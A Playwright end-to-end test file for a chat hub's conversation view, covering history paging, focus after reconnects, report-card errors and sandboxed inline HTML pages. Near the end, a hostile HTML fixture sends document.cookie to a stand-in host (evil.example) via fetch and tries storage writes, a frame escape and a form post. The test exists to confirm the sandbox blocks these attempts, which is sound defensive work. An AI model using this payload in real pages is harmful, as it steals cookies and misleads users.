    expect(hub.historyRequests.at(-1)).toMatchObject({ before: 20 });
  });

  await journey.stage("Reach the start of the conversation", async () => {
    // A second page, from further back: the place holds again.
    await loadEarlierKeepsPlace("Drafted: three lanes, one gate.", true);
    expect(hub.historyRequests.at(-1)).toMatchObject({ before: 10 });
    await expect(page.getByText("No earlier history")).toBeVisible();
    await expect(page.getByRole("button", { name: "Load earlier" })).toBeHidden();
    // cas-71af (1584 QA F01): the pressed button hides on the last page, and
    // focus lands on the line that took its place, not the page body.
    await expect(page.getByText("No earlier history")).toBeFocused();
    await expect(log.getByText("Yesterday")).toBeVisible();
    // cas-2093 (F12): the end of history is stated on screen, not left above the fold.
    await expect(page.getByText("No earlier history")).toBeInViewport();
  });
});

test("HUB-J4 open reports and recover their notices without moving the reader", journeyPart, async ({ page, journey }) => {
  const hub = await journey.hub(historyWorld());
  const log = page.getByRole("log");
  await journey.open();
  await page.getByRole("navigation", { name: "Choose a supervisor" }).getByRole("button", { name: /cas-src/ }).and(page.locator(".conversation-row")).click();
  await expect(log.getByText("Closing it after the notes go out.")).toBeVisible();
  // Reach the real history boundary before reconnecting. The reattach's newest
  // page still advertises older turns; it must not reset the reader's boundary.
  for (const arrived of ["Scheduled for 09:00 with three workers.", "Drafted: three lanes, one gate."]) {
    await page.getByRole("button", { name: "Load earlier" }).click();
    await expect(log.getByText(arrived)).toBeAttached();
  }
  await expect(page.getByText("No earlier history")).toBeVisible();
  /** Top of the first thread item on screen: the line the reader is on. */
  const reading = () => page.evaluate(() => {
    const thread = document.querySelector<HTMLElement>(".conversation-reading.thread")!;
    const top = thread.getBoundingClientRect().top;
    const node = [...thread.querySelectorAll<HTMLElement>(".msgs [data-key]")].find((item) => item.getBoundingClientRect().height > 0 && item.getBoundingClientRect().bottom > top)!;
    return { key: node.dataset.key!, y: Math.round(node.getBoundingClientRect().top) };
  });

  await journey.stage("Open a report the supervisor sent", async () => {
    // cassy#910: the report card opens its hosted copy through a short-lived
    // signed link the machine asks Cloud for, in a new tab on the store's own
    // origin. A file that never reached Cloud says so instead.
    await page.context().route("https://store.test/**", (route) => route.fulfill({ contentType: "text/html", body: "<h1>Release report card</h1>" }));
    const report = log.locator('a[data-artifact-id="art-report"]');
    await report.scrollIntoViewIfNeeded();
    // Inline PDF previews request a session ticket, then proxy bytes. Wait
    // for this fixture's unavailable preview before counting the separate Open URL.
    await expect(log.locator('.rich-attachment:has(a[data-artifact-id="art-report"]) .rich-media')).toContainText("Preview unavailable");
    const reportRequests = hub.artifactRequests.filter((id) => id === "art-report").length;
    const opened = page.waitForEvent("popup");
    await report.click();
    const tab = await opened;
    await tab.waitForURL(/^https:\/\/store\.test\/view\/art-report\?sig=journey$/);
    await expect(tab.getByRole("heading", { name: "Release report card" })).toBeVisible();
    await tab.close();
    expect(hub.artifactRequests.filter((id) => id === "art-report")).toHaveLength(reportRequests + 1);
    expect(page.url()).not.toContain("#artifact:");

    // Journey F6: every failure is said on the card that was pressed, not in
    // a toast at the top of the thread, and no tab is left open.
    const toast = page.locator("#toast.visible");
    const note = (id: string) => log.locator(`a[data-artifact-id="${id}"] .fnote`);
    const local = log.locator('a[data-artifact-id="art-local-draft"]');
    await local.scrollIntoViewIfNeeded();
    await expect(log.locator('.rich-attachment:has(a[data-artifact-id="art-local-draft"]) .rich-media')).toContainText("Preview unavailable");
    const localRequests = hub.artifactRequests.filter((id) => id === "art-local-draft").length;
    await local.click();
    await expect(note("art-local-draft")).toHaveText("This file was only saved on Atlas · Linux. It was never uploaded to Cloud, so it can't open here.");
    await expect(local).toHaveAccessibleName(/never uploaded to Cloud/);
    expect(hub.artifactRequests.filter((id) => id === "art-local-draft")).toHaveLength(localRequests + 1);
    // Known now: opening it again opens no tab at all.
    let popups = 0;
    const countPopup = () => { popups += 1; };
    page.on("popup", countPopup);
    await local.click();
    await expect.poll(() => hub.artifactRequests.filter((id) => id === "art-local-draft").length).toBe(localRequests + 2);
    await expect(note("art-local-draft")).toContainText("only saved on Atlas · Linux");
    expect(popups, "no tab for a file known to be only on the machine").toBe(0);
    page.off("popup", countPopup);

    // cas-e503: Cloud failing says what to do, and a connected machine that
    // sends nothing is not called unreachable while the header says Live.
    await log.locator('a[data-artifact-id="art-cloud-down"]').click();
    await expect(note("art-cloud-down")).toHaveText("Cassy Cloud couldn't open the file right now. Wait a minute, then open it again.");
    await expect(page.locator("#conversation-connection")).toContainText("Live");
    await log.locator('a[data-artifact-id="art-offline"]').click();
    await expect(note("art-offline")).toHaveText("Atlas · Linux is connected but didn't send the file. Try again in a moment.");
    await expect(toast).toHaveCount(0);
    await expect(log).not.toContainText(/\btap\b/i);
    expect(page.context().pages()).toHaveLength(1);

    // cas-c808 QA F01: a note about reaching the machine does not outlive the
    // outage. Once the connection is back it leaves the card; a note about
    // the file itself stays.
    const header = page.locator("#conversation-connection");
    // cas-2093 (F3): the reader is on the file cards when the connection drops.
    const anchorY = (key: string) => page.evaluate((key) => {
      const node = [...document.querySelectorAll<HTMLElement>(".msgs [data-key]")].find((item) => item.dataset.key === key);
      return node ? Math.round(node.getBoundingClientRect().top) : NaN;
    }, key);
    /** The reader's turn stays where it was (within 3 px) across what follows. */
    const holds = async (anchor: { key: string; y: number }, what: string) => {
      // Await the anchored presentation in both directions. The previous
      // asymmetric poll accepted a downward drift before that frame ran.
      await expect.poll(async () => Math.abs(await anchorY(anchor.key) - anchor.y),
        { message: `"${anchor.key}" stays where the reader left it ${what}` }).toBeLessThanOrEqual(3);
    };
    const beforeDrop = await reading();
    // cas-c945 QA F01: what a screen reader would hear. Each change of text
    // is attributed to its nearest live region (role status/alert/log or
    // aria-live, an aria-live="off" ancestor silencing it), and the changed
    // text itself is recorded, not the whole region's.
    await page.evaluate(() => {
      const w = window as unknown as { __heard: string[] };
      w.__heard = [];
      const region = (node: Node): Element | null => {
        for (let element = node instanceof Element ? node : node.parentElement; element; element = element.parentElement) {
          const live = element.getAttribute("aria-live");
          if (live === "off") return null;
          if (live || ["status", "alert", "log"].includes(element.getAttribute("role") ?? "")) return element;
        }
        return null;
      };
      new MutationObserver((records) => {
        const last = new Map<Element, string>();
        for (const record of records) {
          for (const node of record.type === "characterData" ? [record.target] : [...record.addedNodes]) {
            const speaker = region(node);
            const words = node.textContent?.trim() ?? "";
            if (!speaker || !words || last.get(speaker) === words) continue;
            last.set(speaker, words);
            w.__heard.push(words);
          }
        }
      }).observe(document.body, { subtree: true, childList: true, characterData: true });
    });
    hub.hold(PELICAN);
    hub.drop(PELICAN);
    await expect(header).toContainText("Reconnecting");
    await holds(beforeDrop, "when the connection drops");
    // Journey F28: the card that said the machine "is connected" says what
    // the header, banner, row and footer say, without another click, and
    // without a second announcement of the outage.
    const reconnecting = "Lost connection to Atlas · Linux. Reconnecting… Open the file again when it's back.";
    await expect(note("art-offline")).toHaveText(reconnecting);
    await expect(note("art-offline")).not.toHaveAttribute("role", "status");
    await expect(log.locator('a[data-artifact-id="art-offline"]')).toHaveAccessibleName(/Lost connection to Atlas · Linux\. Reconnecting…/);
    await expect(log).not.toContainText("is connected");
    // The banner says the drop once; the card's rewrite is not a second
    // announcement, through its own role or the thread's log around it. The
    // page clock runs the app's next second and a half of timers at once, so
    // a late repeat is heard however loaded the host (cas-c4b2).
    await page.clock.runFor(1_500);
    const heard = await page.evaluate(() => (window as unknown as { __heard: string[] }).__heard);
    expect(heard.filter((words) => /lost connection|reconnecting/i.test(words)), "the outage is spoken once, by the banner").toEqual(["Lost connection to Atlas · Linux. Reconnecting…"]);
    await expect(note("art-offline")).toHaveAttribute("aria-live", "off");
    await log.locator('a[data-artifact-id="art-offline"]').click();
    await expect(note("art-offline")).toHaveText(reconnecting);
    // Opening the card brought it into view: that is where the reader is now.
    const beforeReconnect = await reading();
    const firstPages = hub.historyRequests.filter((request) => request.before === undefined).length;
    hub.release(PELICAN);
    await expect(header).toHaveText(" · Live", { timeout: 30_000 });
    // The reattach asks for the newest page again; it neither moves the reader
    // nor brings "Load earlier" back once the start was reached (cas-2093).
    await expect.poll(() => hub.historyRequests.filter((request) => request.before === undefined).length).toBeGreaterThan(firstPages);
    await holds(beforeReconnect, "across the reconnect");
    await expect(page.getByRole("button", { name: "Load earlier" })).toBeHidden();
    await expect(page.getByText("No earlier history")).toBeAttached();
    await expect(note("art-offline")).toHaveCount(0);
    await expect(note("art-cloud-down")).toHaveCount(0);
    await expect(note("art-local-draft")).toContainText("only saved on Atlas · Linux");
    expect(page.context().pages()).toHaveLength(1);
  });
});

test("HUB-J4 a machine reconnect while reading mid-history keeps keyboard focus on Load earlier (cas-d362)", journeyPart, async ({ page, journey }) => {
  // The multiplex machine path rebuilds the conversation shell a few ms after
  // the header turns Live. A reader who tabs to Load earlier in that window
  // lost focus to the page, and Enter then asked for nothing (cas-d362).
  const hub = await journey.hub({
    machines: [ATLAS],
    paired: ["atlas"],
    multiplex: true,
    history: {
      [PELICAN]: [
        { has_earlier: true, next_before: 20, messages: [you(21, "Is the release ready to cut?", journeyDay(0, 0, 1)), you(23, "Post the notes when it's out.", journeyDay(0, 0, 3)), you(25, "And close the epic.", journeyDay(0, 0, 5))], replies: [sup(22, 21, "Yes. The gate is green on the release branch.", journeyDay(0, 0, 2)), sup(24, 23, "Will do once the tag is pushed.", journeyDay(0, 0, 4)), sup(26, 25, "Closing it after the notes go out.", journeyDay(0, 0, 6))] },
        { has_earlier: true, next_before: 10, messages: [you(11, "Start the QA epic tomorrow morning.", journeyDay(1))], replies: [sup(12, 11, "Scheduled for 09:00 with three workers.", journeyDay(1, 12, 6))] },
        { has_earlier: false, messages: [you(1, "Draft the QA epic plan.", journeyDay(2, 6)), you(3, "Keep it to three lanes.", journeyDay(2, 6, 30))], replies: [sup(2, 1, "Drafted: three lanes, one gate.", journeyDay(2, 6, 6)), sup(4, 3, "Three lanes it is.", journeyDay(2, 6, 36))] },
      ],
    },
  });
  // The reader's Tab lands on Load earlier the moment the header says Live:
  // inside the window before the shell rebuild, where a test's own focus()
  // after waiting for Live would usually arrive too late to see it.
  await page.addInitScript(() => {
    new MutationObserver(() => {
      const armed = window as unknown as { __focusLoadEarlierAtLive?: boolean };
      if (!armed.__focusLoadEarlierAtLive) return;
      if (document.querySelector("#conversation-connection")?.textContent !== " · Live") return;
      armed.__focusLoadEarlierAtLive = false;
      document.querySelector<HTMLElement>(".conversation-load-earlier")?.focus();
    }).observe(document, { subtree: true, childList: true, characterData: true });
  });
  const log = page.getByRole("log");
  const header = page.locator("#conversation-connection");
  const loadEarlier = page.getByRole("button", { name: "Load earlier" });

  await journey.stage("Read mid-history, then move on to the composer", async () => {
    await journey.open();
    await page.getByRole("navigation", { name: "Choose a supervisor" }).getByRole("button", { name: /cas-src/ }).and(page.locator(".conversation-row")).click();
    await expect(log.getByText("Closing it after the notes go out.")).toBeVisible();
    await loadEarlier.scrollIntoViewIfNeeded();
    await loadEarlier.click();
    await expect(log.getByText("Scheduled for 09:00 with three workers.")).toBeAttached();
    await expect(loadEarlier).toBeEnabled();
    await page.getByRole("textbox", { name: "Your message" }).focus();
  });

  await journey.stage("The machine reconnects as the reader tabs back to Load earlier", async () => {
    await page.evaluate(() => { (window as unknown as { __focusLoadEarlierAtLive?: boolean }).__focusLoadEarlierAtLive = true; });
    await hub.down("atlas", { sockets: "close" });
    await expect(header).toContainText("Reconnecting");
    await hub.up("atlas");
    await expect(header).toHaveText(" · Live", { timeout: 30_000 });
    // Past the rebuild: focus is still where the reader put it. The rebuild's
    // timers run on the page clock, not over a fixed pause (cas-c4b2).
    await page.clock.runFor(500);
    await expect(loadEarlier).toBeFocused();
  });

  await journey.stage("Enter loads the start of the conversation", async () => {
    await page.keyboard.press("Enter");
    await expect(log.getByText("Drafted: three lanes, one gate.")).toBeAttached();
    expect(hub.historyRequests.at(-1)).toMatchObject({ before: 10 });
    await expect(page.getByText("No earlier history")).toBeFocused();
  });
});

// cas-c2cb: right after a reconnect the thread is put back at the reader's
// turn (cas-2093). A reader who tabs to Load earlier in that window asked to
// see it; the pending put-back must not then scroll the focused control out of
// the thread. Tall enough history that the two positions differ, on a desktop
// and a phone.
// The reader rests either in the composer (the thread follows its tail) or on
// the header's Raw output (the thread stays on their earlier page).
for (const [name, viewport, rest] of [
  ["following desktop", { width: 1280, height: 800 }, "composer"],
  ["following phone", { width: 390, height: 844 }, "composer"],
  ["reading desktop", { width: 1280, height: 800 }, "header"],
  ["reading phone", { width: 390, height: 844 }, "header"],
] as const) {
  test(`HUB-J4 cas-c2cb ${name}: a reader who tabs to Load earlier during a reconnect sees it, and paging goes on`, journeyPart, async ({ page, journey }) => {
    const turn = (id: number, text: string, day: number) => ({ notification_id: id, reply_to: null, message: text, summary: "", device_id: "journey-device", kind: "answer", attachments: [], at: journeyDay(day, 0, id % 20) });
    await page.setViewportSize(viewport);
    const hub = await journey.hub({
      machines: [ATLAS],
      paired: ["atlas"],
      multiplex: true,
      history: {
        [PELICAN]: [
          { has_earlier: true, next_before: 30, messages: [], replies: Array.from({ length: 12 }, (_, i) => turn(40 + i, `Recent turn ${i}: the release gate and a long operator history to read through.`, 0)) },
          { has_earlier: true, next_before: 10, messages: [], replies: Array.from({ length: 8 }, (_, i) => turn(12 + i, `Earlier turn ${i}: keep the reading position.`, 1)) },
          { has_earlier: false, messages: [], replies: [turn(1, "The oldest entry, reached by keyboard.", 2)] },
        ],
      },
    });
    await page.addInitScript(() => {
      new MutationObserver(() => {
        const armed = window as unknown as { __focusLoadEarlierAtLive?: boolean };
        if (!armed.__focusLoadEarlierAtLive) return;
        if (document.querySelector("#conversation-connection")?.textContent !== " · Live") return;
        armed.__focusLoadEarlierAtLive = false;
        document.querySelector<HTMLElement>(".conversation-load-earlier")?.focus();
      }).observe(document, { subtree: true, childList: true, characterData: true });
    });
    const log = page.getByRole("log");
    const header = page.locator("#conversation-connection");
    const loadEarlier = page.getByRole("button", { name: "Load earlier" });
    /** How much of the focused control the thread shows: its box inside the thread's scroll box. */
    const shownInThread = () => loadEarlier.evaluate((button) => {
      const thread = button.closest<HTMLElement>(".conversation-reading.thread")!.getBoundingClientRect();
      const box = button.getBoundingClientRect();
      return { top: Math.round(box.top - thread.top), bottom: Math.round(thread.bottom - box.bottom), height: Math.round(box.height) };
    });

    await journey.stage(`Read an earlier page mid-history, then move on to the composer (${name})`, async () => {
      await journey.open();
      await page.getByRole("navigation", { name: "Choose a supervisor" }).getByRole("button", { name: /cas-src/ }).and(page.locator(".conversation-row")).click();
      await expect(log.getByText("Recent turn 11:")).toBeVisible();
      await loadEarlier.scrollIntoViewIfNeeded();
      await loadEarlier.click();
      await expect(log.getByText("Earlier turn 0:")).toBeAttached();
      await expect(loadEarlier).toBeEnabled();
      if (rest === "composer") await page.getByRole("textbox", { name: "Your message" }).focus();
      // A header control outside the thread: the thread keeps the earlier page.
      else await page.locator("#conversation-raw-output").focus();
    });

    await journey.stage(`The reader tabs to Load earlier as the machine comes back, and sees it (${name})`, async () => {
      await page.evaluate(() => { (window as unknown as { __focusLoadEarlierAtLive?: boolean }).__focusLoadEarlierAtLive = true; });
      await hub.down("atlas", { sockets: "close" });
      await expect(header).toContainText("Reconnecting");
      await hub.up("atlas");
      await expect(header).toHaveText(" · Live", { timeout: 30_000 });
      // Past the rebuild and the put-back of the reading position, both run
      // on the page clock rather than over a fixed pause (cas-c4b2).
      await page.clock.runFor(650);
      await expect(loadEarlier).toBeFocused();
      const shown = await shownInThread();
      expect(shown.top, "the focused Load earlier is not above the thread").toBeGreaterThanOrEqual(0);
      expect(shown.bottom, "the focused Load earlier is not below the thread").toBeGreaterThanOrEqual(0);
      // cas-d043 H07: it shows its ring on the aurora.
      expect(await loadEarlier.evaluate((node) => { const style = getComputedStyle(node); return style.outlineStyle !== "none" && parseFloat(style.outlineWidth) >= 2; }), "the focused Load earlier shows a ring").toBe(true);
    });

    await journey.stage(`Enter still loads the start of the conversation (${name})`, async () => {
      await page.keyboard.press("Enter");
      await expect(log.getByText("The oldest entry, reached by keyboard.")).toBeAttached();
      expect(hub.historyRequests.at(-1)).toMatchObject({ before: 10 });
      await expect(page.getByText("No earlier history")).toBeFocused();
    });
  });
}

// cas-3aff: a supervisor's HTML page shows inline, in a frame the machine and
// Commander both lock down; threat model:
// docs/design/hub-web/visual-replies-threat-model.md.
const page = (artifact_id: string, name: string) => ({ artifact_id, name, mime: "text/html", size_bytes: 4_096, sha256: "1a".repeat(32) });
const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAIAAABLbSncAAAAEklEQVR4nGP4z8DAwMDAxMAAAB7SAwFcCZ+FAAAAAElFTkSuQmCC", "base64");
const REPORT = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="color-scheme" content="light dark"><title>Gate report</title>
<style>body{font:15px/1.5 system-ui;margin:20px;color:#1b1d24} figure{margin:12px 0} img.chart{width:120px;height:120px;image-rendering:pixelated} @media (prefers-color-scheme: dark){body{background:rgb(21,23,29);color:#e9e6e0}}</style></head>
<body><h1>Gate report</h1><p>All three lanes are green.</p>
<figure><svg role="img" aria-label="Lane diagram" width="240" height="60" viewBox="0 0 240 60"><rect x="4" y="14" width="64" height="32" rx="6" fill="#2f6fde"/><rect x="88" y="14" width="64" height="32" rx="6" fill="#2f9e5b"/><rect x="172" y="14" width="64" height="32" rx="6" fill="#c9821f"/></svg></figure>
<figure><img class="chart" alt="Pass rate chart" src="art-chart"><img class="chart" alt="Inline chart" src="data:image/png;base64,${PNG.toString("base64")}"></figure>
<figure><video aria-label="Run recording" src="art-clip" controls muted width="320" height="180"></video></figure></body></html>`;
const EVIL = "https://evil.example";
const HOSTILE = `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Hostile page</title>
<meta http-equiv="refresh" content="0;url=${EVIL}/refresh">
<link rel="stylesheet" href="${EVIL}/style.css"><link rel="prefetch" href="${EVIL}/prefetch">
<style>@font-face{font-family:leak;src:url(${EVIL}/font.woff)} body{font-family:leak;background:url(${EVIL}/bg.png)}</style>
</head><body><h1>Hostile page</h1>
<img alt="pixel" src="${EVIL}/pixel.png" onerror="parent.postMessage('onerror', '*')"><video src="${EVIL}/clip.webm"></video>
<iframe title="nested" src="${EVIL}/frame"></iframe><object data="${EVIL}/object"></object>
<p><a id="js" href="javascript:parent.postMessage('js-link','*')">Run</a> <a id="top" href="${EVIL}/top" target="_top">Re-pair this machine</a> <a id="pop" href="${EVIL}/pop" target="_blank">Open a window</a></p>
<form action="${EVIL}/form" method="post"><input name="secret" value="x"><button id="submit">Submit</button></form>
<script>document.body.dataset.ran = "1"; parent.postMessage("script", "*"); try { parent.localStorage.setItem("pwned", "1"); localStorage.setItem("pwned", "1"); } catch (e) { parent.postMessage("storage-blocked", "*"); } fetch("${EVIL}/fetch?k=" + document.cookie);</script></body></html>`;

/** The painted RGB of one screen pixel. A 1x1 PNG row has no neighbours, so every filter leaves its bytes raw. */
async function paintedPixel(tab: import("@playwright/test").Page, x: number, y: number): Promise<number[]> {
  const png = await tab.screenshot({ clip: { x, y, width: 1, height: 1 } });
  const data: Buffer[] = [];
  for (let at = 8; at < png.length;) {
    const length = png.readUInt32BE(at);
    if (png.toString("latin1", at + 4, at + 8) === "IDAT") data.push(png.subarray(at + 8, at + 8 + length));
    at += 12 + length;
  }
  return [...inflateSync(Buffer.concat(data)).subarray(1, 4)];
}

for (const [name, viewport] of [["desktop", { width: 1280, height: 800 }], ["phone", { width: 390, height: 844 }]] as const) {
  test(`HUB-J4 cas-3aff ${name}: a supervisor's page shows inline, and a hostile page stays in its sandbox`, journeyPart, async ({ page: tab, journey }) => {
    await tab.setViewportSize(viewport);
    const hub = await journey.hub({
      machines: [ATLAS],
      paired: ["atlas"],
      history: { [PELICAN]: [{ has_earlier: false, messages: [you(1, "Send me the gate report.", journeyDay(0, 0, 1))], replies: [sup(2, 1, "Here it is, and the page the scanner flagged.", journeyDay(0, 0, 2), [page("art-report", "Gate report.html"), page("art-hostile", "Flagged page.html")])] }] },
      visualPages: {
        "art-report": { mime: "text/html; charset=utf-8", body: REPORT },
        "art-hostile": { mime: "text/html; charset=utf-8", body: HOSTILE },
        "art-chart": { mime: "image/png", body: PNG },
        "art-clip": { mime: "video/webm", body: readFileSync(new URL("./visual-clip.webm", import.meta.url)) },
      },
    });
    // Anything the pages send to another host is recorded, never answered.
    const leaked: string[] = [];
    await tab.context().route(`${EVIL}/**`, (route) => { leaked.push(route.request().url()); return route.abort(); });
    await tab.route("https://foreign.example/**", (route) => route.fulfill({ contentType: "text/html", body: `<iframe title="reframed" src="${new URL(route.request().url()).searchParams.get("src")}"></iframe>` }));
    await tab.addInitScript(() => { (window as unknown as { heard: unknown[] }).heard = []; addEventListener("message", (event) => (window as unknown as { heard: unknown[] }).heard.push(event.data)); });
    await journey.open();
    await tab.getByRole("navigation", { name: "Choose a supervisor" }).getByRole("button", { name: /cas-src/ }).and(tab.locator(".conversation-row")).click();
    const log = tab.getByRole("log");
    await expect(log.getByText("Here it is, and the page the scanner flagged.")).toBeVisible();
    // cas-b255: HOSTILE attempts to write exactly this key. Host arrivals,
    // navigation and panel-size persistence may legitimately change meanwhile.
    // Compare the probe's value (including absence), retaining the database
    // isolation check, rather than treating every host write as a frame escape.
    const storage = () => tab.evaluate(async () => ({ local: localStorage.getItem("pwned"), databases: (await indexedDB.databases()).map((db) => db.name).sort() }));
    const before = await storage();
    const tabs = tab.context().pages().length;

    await journey.stage(`See a page the supervisor sent, inline (${name})`, async () => {
      // Page tickets are lazy: bring the persistent page card into view before
      // asking for the iframe it creates. A shorter conversation viewport may
      // leave the first card outside the observer's preload margin.
      await log.locator('figure.visual-page[data-artifact-id="art-report"]').scrollIntoViewIfNeeded();
      const report = log.getByTitle("Gate report.html, a page from the supervisor");
      await report.scrollIntoViewIfNeeded();
      await expect(report).toHaveAttribute("sandbox", "");
      await expect(report).toHaveAttribute("src", /^https:\/\/atlas\.test\/v1\/pages\/ticket-\d+-x+\/art-report$/);
      const inside = tab.frameLocator('iframe[title="Gate report.html, a page from the supervisor"]');
      await expect(inside.getByRole("heading", { name: "Gate report" })).toBeVisible();
      await expect(inside.getByRole("img", { name: "Lane diagram" })).toBeVisible();
      await expect(inside.getByRole("img", { name: "Inline chart" })).toBeVisible();
      await expect.poll(() => hub.pageRequests.filter((path) => /\/art-(chart|clip)$/.test(path)).length, { message: "the page's own image and video load through its ticket" }).toBeGreaterThanOrEqual(2);
      expect(hub.pageRequests.every((path) => path.startsWith("/v1/pages/ticket-"))).toBe(true);
      expect([...hub.pageTickets.values()].map((held) => held.origin)).toEqual(expect.arrayContaining([new URL(tab.url()).origin]));
      // No agent markup ever enters Commander's own document.
      await expect(tab.locator("#app h1", { hasText: "Gate report" })).toHaveCount(0);
      await expect(tab.locator("iframe[srcdoc]")).toHaveCount(0);
    });

    await journey.stage(`Choose Dark on a light device and read the page in dark (${name})`, async () => {
      // cas-a4f4: OS emulation alone cannot prove the in-app preference
      // reaches an embedded page's prefers-color-scheme query.
      // Playwright's page override also forces cross-origin frame media,
      // hiding native color-scheme inheritance. Emulate the light device on
      // the top-level target only; let the embedded page follow its frame.
      await tab.emulateMedia({ colorScheme: null });
      const lightDevice = await tab.context().newCDPSession(tab);
      await lightDevice.send("Emulation.setEmulatedMedia", { features: [{ name: "prefers-color-scheme", value: "light" }] });
      await expect(tab.locator("html")).toHaveAttribute("data-scheme", "light");
      const inside = tab.frameLocator('iframe[title="Gate report.html, a page from the supervisor"]');
      await expect(inside.locator("body")).not.toHaveCSS("background-color", "rgb(21, 23, 29)");
      await showConversationList(tab);
      await tab.getByRole("button", { name: "Appearance & commands", exact: true }).click();
      await tab.getByRole("button", { name: /^Appearance · Dark/ }).click();
      await expect(tab.locator("html")).toHaveAttribute("data-scheme", "dark");
      await openConversation(tab, "cas-src");
      // Re-entry recreates lazy page cards; scroll the card before its iframe exists.
      await log.locator('figure.visual-page[data-artifact-id="art-report"]').scrollIntoViewIfNeeded();
      await log.getByTitle("Gate report.html, a page from the supervisor").scrollIntoViewIfNeeded();
      expect(await tab.evaluate(() => matchMedia("(prefers-color-scheme: dark)").matches), "the device preference stays light").toBe(false);
      await expect(inside.locator("body")).toHaveCSS("background-color", "rgb(21, 23, 29)");
    });

    await journey.stage(`In dark mode the page sits in the theme, and a dark-capable page renders dark (${name})`, async () => {
      await tab.emulateMedia({ colorScheme: "light" });
      // Restore System so the separate OS-preference stage still proves its
      // own input, including the plain page's light fallback.
      await showConversationList(tab);
      await tab.getByRole("button", { name: "Appearance & commands", exact: true }).click();
      await tab.getByRole("button", { name: /^Appearance · System/ }).click();
      await expect(tab.locator("html")).toHaveAttribute("data-scheme", "light");
      await openConversation(tab, "cas-src");
      // cas-2326: the frame chrome follows Commander's scheme and hands it to
      // the page (the iframe's color-scheme); a page without dark styles gets
      // the browser's own opaque backdrop, so it stays legible.
      await tab.emulateMedia({ colorScheme: "dark" });
      await expect(tab.locator("html")).toHaveAttribute("data-scheme", "dark");
      await log.locator('figure.visual-page[data-artifact-id="art-report"]').scrollIntoViewIfNeeded();
      const card = log.locator('a.sheet[data-artifact-id="art-report"]');
      const frame = log.locator('.visual-page[data-artifact-id="art-report"] .visual-frame');
      await expect(frame).toHaveCSS("background-color", await card.evaluate((node) => getComputedStyle(node).backgroundColor));
      await expect(frame.locator("iframe")).toHaveCSS("color-scheme", "dark");
      const inside = tab.frameLocator('iframe[title="Gate report.html, a page from the supervisor"]');
      await expect(inside.locator("body")).toHaveCSS("background-color", "rgb(21, 23, 29)");
      // A page with no dark styles keeps a light backdrop under its dark text.
      const plain = log.getByTitle("Flagged page.html, a page from the supervisor");
      await plain.scrollIntoViewIfNeeded();
      await expect(tab.frameLocator('iframe[title="Flagged page.html, a page from the supervisor"]').getByRole("heading", { name: "Hostile page" })).toBeVisible();
      // A tall frame can extend below the scrollable thread and behind the composer.
      const probe = await plain.evaluate((element) => {
        const frame = element.getBoundingClientRect();
        const thread = element.closest(".conversation-reading.thread")!.getBoundingClientRect();
        return { x: Math.round(Math.min(frame.right, thread.right) - 6), y: Math.round(Math.min(frame.bottom, thread.bottom) - 6) };
      });
      expect(Math.min(...await paintedPixel(tab, probe.x, probe.y)), "the plain page is legible on a light backdrop").toBeGreaterThan(200);
      await tab.emulateMedia({ colorScheme: "light" });
      await expect(tab.locator("html")).toHaveAttribute("data-scheme", "light");
    });

    await journey.stage(`A hostile page can't run script, reach storage, leave its frame or call out (${name})`, async () => {
      const hostileFrame = log.getByTitle("Flagged page.html, a page from the supervisor");
      await hostileFrame.scrollIntoViewIfNeeded();
      const hostile = tab.frameLocator('iframe[title="Flagged page.html, a page from the supervisor"]');
      await expect(hostile.getByRole("heading", { name: "Hostile page" })).toBeVisible();
      await expect(hostile.locator("body")).not.toHaveAttribute("data-ran", "1");
      for (const id of ["#js", "#top", "#pop", "#submit"]) await hostile.locator(id).click();
      await expect(hostile.getByRole("heading", { name: "Hostile page" }), "the meta refresh and every click left the page where it was").toBeVisible();
      expect(tab.url()).toContain("/commander/");
      expect(tab.context().pages()).toHaveLength(tabs);
      expect(await tab.evaluate(() => (window as unknown as { heard: unknown[] }).heard)).toEqual([]);
      expect(await storage()).toEqual(before);
      expect(leaked, "nothing was sent to another host").toEqual([]);
    });

    await journey.stage(`Another site can't frame the page (${name})`, async () => {
      const src = await log.getByTitle("Gate report.html, a page from the supervisor").getAttribute("src");
      const requests = hub.pageRequests.length;
      await tab.evaluate((url) => { const frame = document.createElement("iframe"); frame.title = "foreign host"; frame.src = url; document.body.append(frame); }, `https://foreign.example/host?src=${encodeURIComponent(src!)}`);
      const nested = await tab.frameLocator('iframe[title="foreign host"]').locator('iframe[title="reframed"]').elementHandle();
      const reframed = (await nested!.contentFrame())!;
      await expect.poll(() => hub.pageRequests.length, { message: "the machine served the page; the browser refused to show it" }).toBeGreaterThan(requests);
      await reframed.waitForLoadState("load");
      // The browser shows its own refusal page in the frame, never the report.
      expect(await reframed.getByRole("heading", { name: "Gate report" }).count(), "frame-ancestors names only the minting Commander origin").toBe(0);
      await tab.locator('iframe[title="foreign host"]').evaluate((frame) => frame.remove());
    });

    await journey.stage(`Open the page in its own tab, still sandboxed (${name})`, async () => {
      const opened = tab.waitForEvent("popup");
      await log.locator('a.sheet[data-artifact-id="art-report"]').click();
      const popup = await opened;
      await popup.waitForURL(/^https:\/\/atlas\.test\/v1\/pages\/ticket-\d+-x+\/art-report$/);
      await expect(popup.getByRole("heading", { name: "Gate report" })).toBeVisible();
      expect(hub.artifactRequests, "the raw stored file is never opened").toEqual([]);
      await popup.close();
      // In a tab there is no iframe attribute: the machine's CSP sandbox alone
      // keeps the hostile page scriptless, in place and silent. (A link the
      // operator clicks there navigates that tab only, by design.)
      const hostileOpened = tab.waitForEvent("popup");
      await log.locator('a.sheet[data-artifact-id="art-hostile"]').click();
      const hostileTab = await hostileOpened;
      await expect(hostileTab.getByRole("heading", { name: "Hostile page" })).toBeVisible();
      await hostileTab.waitForLoadState("load");
      await expect(hostileTab.locator("body")).not.toHaveAttribute("data-ran", "1");
      expect(hostileTab.url()).toMatch(/\/v1\/pages\/ticket-\d+-x+\/art-hostile$/);
      expect(leaked, "nothing was sent to another host from the tab either").toEqual([]);
      await hostileTab.close();
    });
  });
}
